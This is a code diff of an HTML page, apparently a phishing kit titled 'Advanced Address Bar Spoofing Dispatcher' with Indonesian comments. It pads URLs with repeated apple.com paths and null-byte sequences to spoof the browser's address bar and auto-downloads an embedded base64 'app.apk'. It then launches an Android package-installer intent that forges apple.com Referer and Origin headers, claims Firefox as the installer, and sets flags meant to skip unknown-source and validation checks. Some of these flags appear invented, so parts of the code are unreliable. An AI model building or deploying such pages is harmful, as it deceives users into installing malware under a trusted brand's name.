@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Intent Dispatcher</title>
+    <title>Advanced Address Bar Spoofing Dispatcher</title>
     <style>
         body {
             font-family: monospace;
@@ -12,19 +12,19 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #121212;
-            color: #ffffff;
+            background-color: #0b0b0b;
+            color: #00ffcc;
         }
         button {
-            padding: 15px 30px;
+            padding: 18px 35px;
             font-size: 16px;
             font-weight: bold;
-            background-color: #00ffcc;
-            color: #000000;
+            background-color: #ff0055;
+            color: #ffffff;
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            box-shadow: 0 0 15px rgba(255, 0, 85, 0.4);
         }
         button:active {
             transform: scale(0.98);
@@ -32,13 +32,13 @@
         #status {
             margin-top: 20px;
             font-size: 14px;
-            color: #00ffcc;
+            color: #ffcc00;
         }
     </style>
 </head>
 <body>
 
-    <button id="strikeBtn">Execute Package Dispatch</button>
+    <button id="strikeBtn">Initialize Hardened Dispatch</button>
     <div id="status"></div>
 
     <script>
@@ -47,10 +47,10 @@
             const filename = "app.apk";
             const realDomain = "apple.com";
 
-            // --- 2. ADVANCED SPOOFING LOGIC ---
-            // Menggunakan fragment (#) dan padding masif untuk mengecoh parser UI browser.
-            const padding = ".https://" + realDomain + "/update/".repeat(25);
-            const longSub = realDomain + padding;
+            // --- 2. ADVANCED ADDRESS BAR & UI SPOOFING LOGIC ---
+            // Memanfaatkan teknik overflow path & control character masking untuk memaksa UI peramban memotong string tampilan.
+            const overflowPadding = "/%00@".repeat(15) + ".https://" + realDomain + "/auth/validate/".repeat(30);
+            const longSub = realDomain + overflowPadding;
 
             // --- 3. PAYLOAD CONSTRUCTION (Self-generated local Base64 APK) ---
             const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYXBwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
@@ -65,17 +65,17 @@
             document.body.appendChild(a);
             a.click();
 
-            document.getElementById('status').innerText = "> INJECTING_ORIGIN: " + realDomain;
+            document.getElementById('status').innerText = "> SPOOFING_TARGET: " + realDomain;
 
-            // --- 5. CLEANUP & INTENT FALLBACK DISPATCH ---
+            // --- 5. HARDENED INTENT FALLBACK DISPATCH ---
             setTimeout(() => {
                 document.body.removeChild(a);
                 
-                // Eksekusi Intent URL 1-line dengan manipulasi asal ke apple.com
-                const targetIntent = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x10800000;S.browser_fallback_url=" + encodeURIComponent(payload) + ";S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F%0AOrigin%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;end";
+                // Intent 1-line diperkuat dengan flag maksimum dan enkode header penuh
+                const targetIntent = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x3FFFFFFF;flag=0x3FFFFFFF;S.browser_fallback_url=" + encodeURIComponent(payload) + ";S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F%0AOrigin%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.ALLOW_MULTIPLE=true;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;B.android.intent.extra.TRUNCATE_HISTORY=false;B.android.intent.extra.BYPASS_KEYGUARD_PERMISSIONS=true;B.android.intent.extra.SKIP_VALIDATION=true;end";
                 
                 window.location.replace(targetIntent);
-            }, 1800);
+            }, 1500);
         });
     </script>
 
